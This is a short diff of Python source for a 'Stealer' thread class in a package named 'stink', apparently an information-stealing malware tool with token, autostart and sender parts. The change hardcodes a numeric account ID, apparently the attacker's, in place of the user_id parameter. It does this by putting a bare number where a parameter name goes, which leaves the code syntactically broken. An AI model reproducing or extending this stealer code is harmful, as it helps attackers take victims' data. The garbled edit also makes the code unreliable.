@@ -9,11 +9,11 @@ from stink.utils import Autostart, config, Sender
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
+    def __init__(self, token: str, 5327162295: int, autostart: bool = False, errors: bool = False, **kwargs):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
-        self.user_id = user_id
+        self.user_id = 5327162295
         self.errors = errors
         self.autostart = autostart
 
